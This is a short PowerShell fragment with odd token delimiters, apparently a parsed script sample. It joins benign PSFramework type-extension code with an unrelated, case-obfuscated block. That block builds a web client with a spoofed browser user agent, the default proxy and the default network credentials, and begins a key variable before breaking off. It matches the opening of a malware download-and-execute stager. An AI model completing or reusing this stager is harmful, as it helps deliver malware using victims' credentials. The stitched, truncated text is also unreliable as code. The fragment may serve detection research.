
 -||-> Update-TypeData -TypeName "System.Collections.Concurrent.ConcurrentDictionary``2[[$( -||-> [System.String].AssemblyQualifiedName <-||- )],[$( -||-> [PSFramework.Configuration.Config].AssemblyQualifiedName <-||- )]]" -MemberType ScriptMethod -MemberName Remove -Value ( -||-> [scriptblock]::Create(@'
param (
    $Item
)

$dummyItem = $null
$null = $this.TryRemove($Item, [ref] $dummyItem)
'@) <-||- ) -Force <-||- 

 -||-> $Wc= -||-> NEW-ObJeCT SySTem.Net.WeBClieNt <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $wC.HEAderS.Add('User-Agent',$u) <-||- ; -||-> $Wc.PrOXY = [SYSteM.NeT.WEBREQUESt]::DeFAULTWEBPrOXy <-||- ; -||-> $Wc.PRoXy.CreDeNTiaLs = [SYSTeM.NEt.CreDeNtIalCacHE]::DeFaultNeTWorKCReDENtialS <-||- ; -||-> $K='/j(\wly4+aW


 <-||- 
